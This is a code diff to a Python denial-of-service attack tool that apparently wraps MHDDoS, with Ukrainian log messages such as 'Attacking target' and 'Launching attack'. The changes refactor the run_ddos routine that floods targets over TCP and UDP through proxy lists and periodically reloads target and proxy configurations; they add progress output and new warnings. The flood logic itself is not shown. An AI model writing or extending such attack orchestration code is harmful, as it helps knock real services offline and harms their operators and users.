@@ -15,7 +15,7 @@ from src.core import (
     FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS,
 )
 from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood, AttackSettings
-from src.output import show_statistic, print_banner
+from src.output import print_progress, show_statistic, print_banner
 from src.proxies import ProxySet
 from src.system import fix_ulimits, is_latest_version, setup_event_loop, WINDOWS_WAKEUP_SECONDS
 from src.targets import Target, TargetsLoader
@@ -125,6 +125,7 @@ async def run_ddos(
 ):
     loop = asyncio.get_event_loop()
     stats = []
+    print_stats = debug or table
 
     # initial set of proxies
     if proxies.has_proxies:
@@ -155,7 +156,7 @@ async def run_ddos(
             'loop': loop,
             'settings': settings,
         }
-        if not (table or debug):
+        if not print_stats:
             logger.info(
                 f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
                 % (target.url.host, target.url.port, method)
@@ -163,7 +164,7 @@ async def run_ddos(
         return mhddos_main(**kwargs)
 
     logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
-    if not (table or debug):
+    if not print_stats:
         # Keep the docs/info on-screen for some time before outputting the logger.info above
         await asyncio.sleep(5)
 
@@ -251,36 +252,26 @@ async def run_ddos(
                 cycle_start = time.perf_counter()
 
     # setup coroutine to print stats
-    if debug or table:
+    if print_stats:
         tasks.append(loop.create_task(stats_printer()))
+    else:
+        print_progress(len(proxies), use_my_ip, False)
 
     async def reload_targets(delay_seconds: int = 30):
         while True:
             try:
                 await asyncio.sleep(delay_seconds)
                 targets, changed = await targets_loader.load(resolve=True)
-                if not changed:
+                if changed and not targets:
                     logger.warning(
-                        f"{cl.YELLOW}Перелік цілей не змінився - "
-                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
-                    )
-                elif not targets:
-                    logger.warning(
-                        f"{cl.RED}Не знайдено жодної доступної цілі - "
-                        f"чекаємо {delay_seconds} сек до наступної перевірки{cl.RESET}"
+                        f"{cl.MAGENTA}Завантажено порожній конфіг - буде використано попередній{cl.RESET}"
                     )
                 else:
                     await install_targets(targets)
             except asyncio.CancelledError as e:
                 raise e
             except Exception as exc:
-                logger.warning(
-                    f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")
-            finally:
-                logger.info(
-                    f"{cl.YELLOW}Оновлення цілей через: "
-                    f"{cl.BLUE}{delay_seconds} секунд{cl.RESET}"
-                )
+                logger.warning(f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")
 
     # setup coroutine to reload targets
     tasks.append(loop.create_task(reload_targets(delay_seconds=reload_after)))
@@ -289,14 +280,18 @@ async def run_ddos(
         while True:
             try:
                 await asyncio.sleep(delay_seconds)
-                await proxies.reload()
+                if (await proxies.reload()) == 0:
+                    logger.warning(
+                        f"{cl.MAGENTA}Не вдалося перезавантажити список проксі - буде використано попередній{cl.RESET}"
+                    )
+
             except asyncio.CancelledError:
                 raise
             except Exception:
                 pass
 
     # setup coroutine to reload proxies
-    if proxies is not None:
+    if proxies.has_proxies:
         tasks.append(loop.create_task(reload_proxies(delay_seconds=reload_after)))
 
     await asyncio.gather(*tasks, return_exceptions=True)
